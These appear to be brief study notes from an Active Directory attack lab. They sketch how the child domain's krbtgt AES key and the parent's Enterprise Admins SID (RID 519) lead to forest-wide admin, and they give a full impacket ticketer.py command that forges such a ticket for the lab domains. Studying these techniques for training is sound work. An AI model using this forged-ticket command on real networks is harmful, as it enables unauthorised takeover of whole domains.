
`aeskey of parent krbTGT -> pwned domain -> domain SID (dollarcorp.moneycorp.local) -> domain SID(moneycrop.local)-519 administrator`

`aeskey of parent krbTGT -> pwned domain -> domain SID (child) -> domain SID(parent)-519 administrator`



```
ticketer.py -aesKey 154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 -domain DOLLARCORP.MONEYCORP.LOCAL -domain-sid S-1-5-21-719815819-3726368948-3917688648 -extra-sid S-1-5-21-335606122-960912869-3279953914-519 Administrator -user-id 500
```